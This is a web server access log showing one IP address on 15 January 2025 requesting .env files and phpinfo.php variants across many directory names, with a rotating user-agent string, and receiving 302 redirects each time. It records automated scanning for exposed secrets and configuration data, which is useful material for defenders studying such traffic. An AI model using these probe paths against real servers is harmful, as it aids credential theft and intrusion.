78.153.140.203 - - [15/Jan/2025:19:51:25 +0000] "GET /Inc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36 OPR/47.0.2631.80"
78.153.140.203 - - [15/Jan/2025:19:51:26 +0000] "GET /Infos/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.7) Gecko/20091221 Firefox/45.0"
78.153.140.203 - - [15/Jan/2025:19:51:31 +0000] "GET /Lib/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/412.7 (KHTML, like Gecko) Safari/412.5"
78.153.140.203 - - [15/Jan/2025:19:51:34 +0000] "GET /Library/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36"
78.153.140.203 - - [15/Jan/2025:19:51:37 +0000] "GET /Logging/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 5.0.2; VK810 4G Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"
78.153.140.203 - - [15/Jan/2025:19:51:40 +0000] "GET /Media/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.3; en-us; SAMSUNG SM-S765C Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36"
78.153.140.203 - - [15/Jan/2025:19:51:41 +0000] "GET /Misc/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko) Safari/531.9"
78.153.140.203 - - [15/Jan/2025:19:51:42 +0000] "GET /New/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; GT-I9100 Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
78.153.140.203 - - [15/Jan/2025:19:51:45 +0000] "GET /Phpinfo.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
78.153.140.203 - - [15/Jan/2025:19:51:46 +0000] "GET /PHPinfo.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 6.0.1; SM-G900P Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
78.153.140.203 - - [15/Jan/2025:19:51:47 +0000] "GET /PHPINFO.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 3.2.1; en-us; LePanII Build/HTK75) AppleWebKit/534.13 (KHTML, like Gecko) Version/4.0 Safari/534.13"
78.153.140.203 - - [15/Jan/2025:19:51:48 +0000] "GET /Production/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; MASAJS)"
78.153.140.203 - - [15/Jan/2025:19:51:49 +0000] "GET /Public/.env HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)"
78.153.140.203 - - [15/Jan/2025:19:51:50 +0000] "GET /Server/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:70.0) Gecko/20190101 Firefox/70.0"
78.153.140.203 - - [15/Jan/2025:19:51:51 +0000] "GET /Shared/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Android 5.1; Mobile; rv:48.0) Gecko/48.0 Firefox/48.0"
78.153.140.203 - - [15/Jan/2025:19:51:51 +0000] "GET /Site/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:14.0) Gecko/20100101 Firefox/14.0.1"
78.153.140.203 - - [15/Jan/2025:19:51:53 +0000] "GET /Stage/.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/534.20.8 (KHTML, like Gecko) Version/5.1 Safari/534.20.8"
78.153.140.203 - - [15/Jan/2025:19:51:53 +0000] "GET /Staging/.env HTTP/1.1" 302 331 "-" "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SAMSUNG-SM-T377A Build/MMB29K)"
